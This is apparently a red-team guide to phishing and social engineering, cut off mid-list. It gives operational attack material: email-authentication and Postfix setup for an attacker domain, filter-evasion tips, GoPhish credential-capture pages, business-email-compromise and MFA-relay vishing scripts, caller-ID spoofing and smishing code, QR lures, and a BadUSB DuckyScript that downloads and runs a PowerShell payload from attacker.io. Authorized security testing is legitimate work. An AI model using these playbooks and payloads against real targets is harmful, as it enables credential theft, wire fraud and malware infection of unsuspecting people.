"# Phishing & Social Engineering Overview\n\n## ◈ BEGINNER\n\n### What Is Phishing?\n\n**Phishing** is the art of deceiving people into taking an action that benefits an attacker — clicking a link, entering credentials, wiring money, or running a file. Unlike most technical attacks that target software vulnerabilities, phishing targets the human. It is the single most prevalent initial access vector in real-world breaches, responsible for over 70% of successful enterprise compromises.\n\n**Why does it work?** Security training teaches users to look for misspellings and suspicious links — but modern phishing is personalized, technically sound, and psychologically precise. An email that appears to come from the CFO's actual account, referencing a real ongoing project, arriving during a stressful period, is nearly indistinguishable from a legitimate request.\n\n**Key terms:**\n- **Phishing** — tricking users into revealing credentials or executing malware via deceptive messages (email, SMS, voice, QR code)\n- **Spear phishing** — targeted phishing using personal details from OSINT (LinkedIn, breach data, public posts) to craft convincing lures\n- **BEC (Business Email Compromise)** — impersonating executives for wire fraud or data theft; no malware involved, purely social engineering\n- **Vishing** — voice phishing; real-time phone calls to relay OTPs, gain remote access, or manipulate financial actions\n- **Smishing** — SMS-based phishing; bypasses corporate email security, targets mobile devices\n- **Quishing** — QR code phishing; the image bypasses URL scanners in email gateways\n- **AiTM (Adversary-in-the-Middle)** — reverse proxy phishing (Evilginx2) that transparently proxies the real site and captures session cookies after MFA completes\n- **GoPhish** — open-source phishing campaign manager with tracking (email opens, clicks, credential submissions)\n- **OSINT-driven personalization** — using LinkedIn, breach databases, and public posts to reference manager names, current projects, and company events in lures\n- **SPF/DKIM/DMARC** — email authentication standards; required for inbox delivery — without them, major providers reject or quarantine 100% of mail\n- **Domain aging** — registering domains 30–90 days before a campaign so spam filters don't score them as fresh/suspicious\n- **Lure** — the specific phishing message or URL delivered to a victim\n- **Pretext** — the fabricated scenario (IT helpdesk, HR, IRS, vendor) used to justify the request\n\n**The six Cialdini principles** form the psychological backbone of every successful phish: Authority (impersonate CEO/IT/IRS), Urgency (\"expires in 2 hours\"), Social Proof (\"others on your team already did this\"), Reciprocity (send gift, then ask), Liking (personalize with their name/connections), and Commitment (small first step primes larger compliance).\n\n**Analogy:** Phishing is like a skilled con artist who studies a mark for weeks before making their move. They know your name, your boss's name, your company's logo, and they time their approach for when you're most stressed. The con succeeds not because you're naive, but because the context is perfectly crafted to bypass your analytical thinking.\n\n## ◈ INTERMEDIATE\n\nPhishing is the most prevalent initial access vector in real-world breaches — responsible for over 70% of successful enterprise compromises. Modern phishing has evolved far beyond simple email lures: today's campaigns blend technical precision (email authentication bypass, domain aging, JS injection), psychological manipulation, and multi-channel delivery to defeat both technical controls and human awareness training.\n\n## Cialdini's Principles Applied to Phishing\n\nRobert Cialdini's six principles of influence form the psychological backbone of every successful phish:\n\n| Principle | Application |\n|-----------|-------------|\n| **Authority** | Impersonate CEO, IT helpdesk, IRS, Microsoft. \"Your account requires immediate verification — IT Security Team\" |\n| **Urgency/Scarcity** | \"Your password expires in 2 hours.\" \"You have 1 unread security alert.\" Deadline triggers bypass analytical thinking |\n| **Social Proof** | \"Other employees in your team have already updated their credentials\" |\n| **Reciprocity** | Send a genuine-looking gift card, then follow up requesting action |\n| **Liking** | Personalize with target's name, LinkedIn data, mutual connections, local sports teams |\n| **Commitment** | Multi-step flows — small initial action (verify name) primes willingness to complete larger action (enter password) |\n\n**OSINT-driven personalization**: Use LinkedIn, Hunter.io, breach databases, and target's public posts to personalize beyond first name. Reference their manager's name, recent company announcements, or active projects. Spear phishing with personalization achieves 3–5× higher click rates vs generic campaigns.\n\n---\n\n## Email Infrastructure Setup\n\n### Domain Selection and Aging\n\n- **Aged domains**: Register domains 30–90 days before campaign. Fresh domains scored highly by spam filters.\n- **Domain look-alikes**: typosquatting (`microsofft.com`), subdomain abuse (`login.microsoft.com.corp-update.io`), hyphenation (`micro-soft-account.com`), additional TLDs (`corporate.co`, `corporate.net`)\n- **Pre-categorize**: Visit domain from residential IPs; submit to Cisco Talos, Barracuda, McAfee SiteAdvisor for categorization as \"business/finance\" before campaign\n\n### SPF, DKIM, DMARC Configuration\n\nThese are **mandatory** — without them, major providers reject or spam-folder 100% of email:\n\n```bash\n# SPF: authorize your sending server only\n_spf.attacker.io TXT \"v=spf1 ip4:45.77.X.X -all\"\n\n# DKIM: generate keypair\nopendkim-genkey -t -s mail -d attacker.io\n# Add public key to DNS:\nmail._domainkey.attacker.io TXT \"v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA...\"\n\n# DMARC: strict policy for legitimacy, or monitor-only\n_dmarc.attacker.io TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@attacker.io\"\n```\n\n### SMTP Setup\n\n```bash\n# Install Postfix on VPS\napt install postfix opendkim opendkim-tools -y\n\n# /etc/postfix/main.cf (key settings)\nmyhostname = mail.attacker.io\nsmtp_tls_security_level = may\nmilter_protocol = 2\nsmtpd_milters = inet:localhost:8891 # OpenDKIM\nnon_smtpd_milters = inet:localhost:8891\n\n# Warm up IP: send low-volume legitimate-looking emails first\n# Monitor deliverability via mail-tester.com (target: 10/10)\n```\n\n### Test Deliverability\n```bash\n# Check score before campaign\ncurl -s \"https://www.mail-tester.com/...\" # use mail-tester API\n# Check IP reputation\ncurl \"https://check.spamhaus.org/...\"\n# Verify headers land in inbox (not spam)\nswaks --to target@gmail.com --from noreply@attacker.io \\\n --server mail.attacker.io --auth-user postfix --auth-password X\n```\n\n---\n\n## GoPhish Campaign Workflow\n\nGoPhish is the standard open-source phishing campaign manager:\n\n### Setup\n```bash\nwget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip\nunzip gophish*.zip && chmod +x gophish\n# Edit config.json: set admin_server to 127.0.0.1, listen_url to 0.0.0.0:443\n./gophish &\n# Access admin: https://127.0.0.1:3333 (default admin/gophish)\n```\n\n### Campaign Components\n1. **Sending Profile** — SMTP host, from address, DKIM via Postfix relay\n2. **Email Template** — HTML body; `{{.FirstName}}`, `{{.URL}}`, `{{.TrackingURL}}` placeholders\n3. **Landing Page** — cloned login page; credential capture on submit; redirect to real site\n4. **User Groups** — CSV import: `First Name,Last Name,Email,Position`\n5. **Campaign** — link all above, set schedule (business hours for realism)\n\n### Tracking\nGoPhish tracks: email opened (pixel), link clicked (redirect through GoPhish), credentials submitted, campaign timeline. Results exportable as CSV/JSON for reporting.\n\n---\n\n## Whaling and Business Email Compromise (BEC)\n\nBEC targets executives and financial controllers with no malware — purely social engineering for wire transfer or data theft:\n\n### Common BEC Scenarios\n- **CEO fraud**: Attacker impersonates CEO, emails CFO requesting urgent wire transfer to new vendor\n- **Invoice manipulation**: Intercept legitimate vendor email thread, substitute bank account\n- **HR payroll redirect**: Email HR from spoofed employee address requesting direct deposit change\n- **Gift card**: CEO requests purchase of gift cards \"for client bonuses\", requests codes via reply\n\n### BEC Infrastructure\n- Use display name spoofing: From: `\"John Smith (CEO)\" ` — most email clients show name only\n- Register similar domain: `corp-name.co` vs `corp-name.com` — reply-to mismatch\n- If M365 compromised: send from legitimate compromised account (best deliverability)\n- Reference real business context from LinkedIn/company press releases\n\n---\n\n## Vishing (Voice Phishing)\n\n### Real-Time MFA Relay\nThe \"MFA fatigue + voice\" combo:\n1. Attacker starts login on real site → triggers OTP to victim's phone\n2. Attacker calls victim posing as IT: \"We detected suspicious login to your account. I need to verify — please read the 6-digit code you just received\"\n3. Victim reads OTP → attacker completes login before code expires\n\n### Vishing Pretexts\n- IT helpdesk: password reset, software install, security update\n- Bank fraud department: suspicious transaction, verify card details\n- Microsoft/Apple support: fake virus alert, need remote access\n- IRS/government: tax compliance, warrant, mandatory verification\n\n### Voice Spoofing\n```bash\n# SIP spoofing via VoIP provider (e.g., SpoofCard, Twilio with caller ID set)\n# For red team: use authorized VoIP trunk with spoofed caller ID\ntwilio calls create \\\n --from \"+12025551234\" \\\n --to \"+15551234567\" \\\n --url \"https://handler.attacker.io/vishing-script\"\n```\n\n---\n\n## Smishing (SMS Phishing)\n\n```bash\n# Twilio SMS campaign\nfrom twilio.rest import Client\nclient = Client(ACCOUNT_SID, AUTH_TOKEN)\nmessage = client.messages.create(\n body=\"[Alert] Your Microsoft account was accessed from Russia. Verify immediately: https://ms-acct-verify.io/login\",\n from_=\"+18005550199\", # short code or long code\n to=\"+15551234567\"\n)\n```\n\n**SMS delivery**: Short codes (5-6 digit) have high trust; 10DLC long codes require registration. For red team: use authorized carrier with purpose-registered numbers. SMS link shorteners (`bit.ly`, `tinyurl`) are now flagged — use aged domain with SSL.\n\n---\n\n## Microsoft Teams / Slack Phishing\n\nInternal messaging platforms have no email filtering:\n\n### Teams Phishing (External Invite)\n```python\n# M365 external messaging: any Teams user can message cross-tenant\n# Target: internal users who accept external contact requests\n# Pretext: \"Microsoft Security Alert\" from external tenant\n# Payload: link to external SharePoint with embedded redirect\n```\n\n### Teams GIF Attack (CVE-2020-1456 variant pattern)\n- Send malicious GIF that exfiltrates auth token when previewed in Teams\n- Modern: send link to SharePoint doc requiring re-auth (credential harvesting)\n\n### Slack Phishing\n- Create Slack workspace with company-looking name; invite target via email\n- Or exploit `/slack` integrations: phishing via Slackbot impersonation\n- Slack direct messages from compromised accounts: insider threat vector\n\n---\n\n## QR Code Phishing (Quishing)\n\nQR codes bypass URL scanners in email gateways (scanners can't click a QR code):\n\n```python\nimport qrcode\nqr = qrcode.make(\"https://login-secure.attacker.io/verify\")\nqr.save(\"verification.png\")\n```\n\n**Delivery**: Embed in email body as image, printed material, phishing landing page. Pretext: \"Scan to verify your account\" or \"Scan to access the secure portal.\" Mobile devices often have fewer security controls — no corporate proxy, no EDR.\n\n---\n\n## USB Drop / Physical Phishing\n\n**Rubber Ducky / BadUSB**:\n```bash\n# USB device emulates keyboard; types payload when inserted\n# DuckyScript:\nDELAY 1000\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.io/p')\"\nENTER\n```\n\n**USB drop methodology**:\n1. Pre-load with enticing filename: `Salary_Review_2026.pdf.exe` or weaponized Office doc\n2. Drop in parking lot, lobby, restrooms of target facility\n3. ~50% of dropped drives get plugged in (per academic studies)\n4.
